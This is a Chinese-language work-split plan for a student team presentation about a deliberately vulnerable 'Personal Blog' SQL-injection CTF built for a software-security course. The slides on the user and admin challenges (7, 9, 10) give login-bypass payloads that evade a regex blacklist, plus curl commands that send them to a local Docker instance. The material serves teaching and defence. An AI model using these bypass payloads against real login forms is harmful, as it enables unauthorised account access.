# PPT 分工方案（按页数）

## PPT 结构总览

| 页数 | 标题 | 负责人 | 时长 |
|------|------|--------|------|
| 封面 | Personal Blog CTF | Zhenghan PEI | 30秒 |
| 1 | Table of Contents | Zhenghan PEI | 1分钟 |
| 2 | Project Overview | Zhenghan PEI | 2-3分钟 |
| 3 | Architecture & Design | Haihang WANG | 3-4分钟 |
| 4 | The 'Hidden' Vulnerability | Haihang WANG | 2-3分钟 |
| 5 | Challenge Scope | Peipei LU | 1分钟 |
| 6 | User Challenge: Reconnaissance | Peipei LU | 2分钟 |
| 7 | User Challenge: Exploitation | Peipei LU | 2-3分钟 |
| 8 | Admin Challenge: Reconnaissance | Dongshan ZHU | 2分钟 |
| 9 | Admin Challenge: Exploitation | Dongshan ZHU | 2-3分钟 |
| 10 | Live Demo | Dongshan ZHU | 4-5分钟 |
| 11 | Conclusion | Zhenghan PEI | 1-2分钟 |
| 11 | Key Takeaways | Zhenghan PEI | 1-2分钟 |
| 结尾 | Thank you | Zhenghan PEI | 30秒 |

---

## 详细分工

### **Zhenghan PEI (Team Leader)** - 开场、概述与总结

#### 封面页
- **内容：** 项目标题、团队信息、日期
- **要点：**
  - Personal Blog CTF
  - Unified Deployment & Design Guide (Project 2)
  - 团队成员介绍
  - Course: II.3524 - Sécurité Logicielle

#### 第1页：Table of Contents
- **内容：** 演讲结构概览
- **要点：**
  1. Project Overview
  2. Architecture & Design
  3. CTF Challenges
  4. Solution Walkthrough
  5. Demo
  6. Conclusion

#### 第2页：Project Overview
- **内容：** 项目概述
- **要点：**
  - **What is this project?**
    - 自包含的、面向教学的 SQL 注入 CTF 服务
    - 模拟简化的"个人博客"应用
  - **Core Philosophy:**
    - Clean Business Logic ≠ Secure Application
    - 漏洞来自**依赖行为**（数据库驱动层）
    - "Docker-First"设计：冻结状态，可重现的利用
  - **Target Audience:**
    - CTF 玩家
    - 安全学习者
    - 挑战作者

#### 第11页：Conclusion
- **内容：** 项目总结
- **要点：**
  - 项目作为教学工具的价值
  - 强调依赖层安全的重要性

#### 第11页：Key Takeaways
- **内容：** 核心要点
- **要点：**
  1. **Dependency Risk:** 应用逻辑可以完美，但如果驱动/ORM有缺陷（或配置错误），应用仍然脆弱
  2. **Partial Sanitization is Dangerous:**
     - 依赖正则黑名单（阻止'OR'、'SELECT'）通常可被绕过
     - 应普遍使用参数化查询（预编译语句）
  3. **Defense in Depth:** 前端限制不提供真正的安全
  - *"This project is a teaching artifact, not a production reference."*

#### 结尾页：Thank you
- **内容：** 致谢与答疑
- **要点：**
  - 感谢听众
  - 开放提问

**总时长：** 约 6-8 分钟

---

### **Haihang WANG** - 架构与技术实现

#### 第3页：Architecture & Design
- **内容：** 技术架构图
- **要点：**
  - **架构流程：**
    ```
    Browser
      ↓
    FastAPI (App) - "Clean Logic"
      ↓
    CTF SQL Driver - "Injected Vuln"
      ↓
    MariaDB
    ```
  - **系统特征：**
    - Single Container（单容器）
    - JWT Auth（JWT 认证）
    - Static Assets（静态资源）
  - **CTF 特性：**
    - CTF Mode Enforced: 启动时硬编码（`builtins.CTF_MODE`）
    - Partial Sanitization: 在 helper 中实现，不在业务逻辑中

#### 第4页：The 'Hidden' Vulnerability
- **内容：** 隐藏漏洞机制
- **要点：**
  - **业务逻辑（看起来安全）：**
    ```python
    conn = get_conn(sanitize_email)
    cur.execute("SELECT * FROM users WHERE email=%s", (email,))
    ```
  - **在 `get_conn` 内部（依赖层）：**
    ```python
    def get_conn(sanitizer):
        # 如果是 CTF 会话，注入漏洞行为
        return ctf_sql.MySql.connect(..., sanitizer=sanitizer)
    ```
  - **关键点：**
    - 漏洞不在可见的业务逻辑中
    - 通过依赖层注入
    - 模拟真实场景中库引入 bug 的情况

**总时长：** 约 5-7 分钟

---

### **Peipei LU** - User Challenge 详解

#### 第5页：Challenge Scope
- **内容：** 挑战范围概述
- **要点：**
  - **1. User Flag Challenge:**
    - Objective: 以特定用户身份登录
    - Constraint: Email 参数
    - Defense: 阻止基本 SQL 如 'OR', '1=1'
  - **2. Admin Flag Challenge:**
    - Objective: 找到管理员面板并登录
    - Constraint: 隐藏 URL + 用户名参数
    - Defense: 需要特定字符串模式（拉丁字符）

#### 第6页：User Challenge: Reconnaissance
- **内容：** 用户挑战 - 信息收集
- **要点：**
  - **Step 1: Information Gathering**
    - 检查公共 API 端点：`GET /api/home`
    - 响应泄露作者邮箱（故意的信息泄露）
  - **示例响应：**
    ```json
    {
      "posts": [
        {
          "title": "Welcome",
          "author_email": "alice@example.com"
        }
      ]
    }
    ```
  - **Target Acquired:** alice@example.com

#### 第7页：User Challenge: Exploitation
- **内容：** 用户挑战 - 绕过清理机制
- **要点：**
  - **Bypassing Sanitization Rules:**
    - **Blocked:** 'OR', '=', 'TRUE', '--'
    - **Allowed:** 'AND', '()', '"'
  - **The Payload:**
    - 构造一个使查询有效而无需知道密码的载荷
    - `alice@example.com' AND ('1') #`
  - **Resulting Query:**
    ```sql
    SELECT id FROM users
    WHERE email = 'alice@example.com' AND ('1') #' AND pass=...
    ```
  - **解释：** `#` 注释掉了密码检查

**总时长：** 约 5-6 分钟

---

### **Dongshan ZHU** - Admin Challenge 与演示

#### 第8页：Admin Challenge: Reconnaissance
- **内容：** 管理员挑战 - 信息收集
- **要点：**
  - **Step 1: Finding the Admin Panel**
    - 管理员 URL 未在首页链接
    - 通过 `ADMIN_LOGIN_URL` 配置（默认：`/admin456_login`）
    - **方法：** 模糊测试或检查 'config.json'（如果暴露）

#### 第9页：Admin Challenge: Exploitation
- **内容：** 管理员挑战 - 高级 SQL 注入
- **要点：**
  - **Step 2: Advanced SQLi**
    - **约束：** 清理器要求在第一个引号之前**至少 5 个拉丁字母**
    - **目标：** 用户名字段
  - **The Payload:**
    ```
    admin' || ('1')#
    ```
  - **Payload 解释：**
    - `"admin"` 满足 5 字母要求
    - `||` 用作逻辑 OR（MySQL 特定/ANSI 模式相关），因为标准 'OR' 被阻止

#### 第10页：Live Demo
- **内容：** 现场演示
- **要点：**
  - **DEMO TIME (Max 5 Minutes)**
  - **演示步骤：**
    1. 部署 Docker 容器
    2. 利用用户登录（Alice）
    3. 利用管理员登录
    4. 通过 API 获取 Flags
  - **演示命令准备：**
    ```bash
    # 1. 部署
    docker run -p 8000:8000 personal-blog-ctf
    
    # 2. 用户挑战
    curl -X POST http://localhost:8000/api/login/user \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "email=alice@example.com' AND ('1')#" \
      --data-urlencode "password=anything"
    
    # 3. 管理员挑战
    curl -X POST http://localhost:8000/api/login/admin \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "username=admin' || ('1')#" \
      --data-urlencode "password=anything"
    
    # 4. 获取 Flags
    curl http://localhost:8000/api/flags
    ```

**总时长：** 约 8-10 分钟（含演示）

---

## 时间分配总览

| 部分 | 负责人 | 页数 | 预计时长 |
|------|--------|------|----------|
| 开场 + 概述 | Zhenghan PEI | 封面, 1, 2 | 3-4 分钟 |
| 架构设计 | Haihang WANG | 3, 4 | 5-7 分钟 |
| 用户挑战 | Peipei LU | 5, 6, 7 | 5-6 分钟 |
| 管理员挑战 + 演示 | Dongshan ZHU | 8, 9, 10 | 8-10 分钟 |
| 总结 | Zhenghan PEI | 11, 结尾 | 2-3 分钟 |
| **总计** | | **11页** | **23-30 分钟** |

---

## 演示准备清单

### Dongshan ZHU 需要准备：
- [ ] Docker 镜像已构建并测试
- [ ] 演示环境准备（网络、投影等）
- [ ] curl 命令或 Postman 请求已测试
- [ ] 备用方案（截图/录屏）
- [ ] 时间控制（最多 5 分钟）

### 所有成员需要准备：
- [ ] 熟悉自己的部分
- [ ] 准备过渡语句
- [ ] 统一术语使用
- [ ] 时间控制练习

---

## 过渡语句建议

- **Zhenghan → Haihang:** "现在让我们深入了解系统的技术架构..."
- **Haihang → Peipei:** "了解了架构后，让我们看看第一个挑战..."
- **Peipei → Dongshan:** "完成用户挑战后，我们来看更复杂的管理员挑战..."
- **Dongshan → Zhenghan:** "演示完成后，让我们总结一下关键要点..."
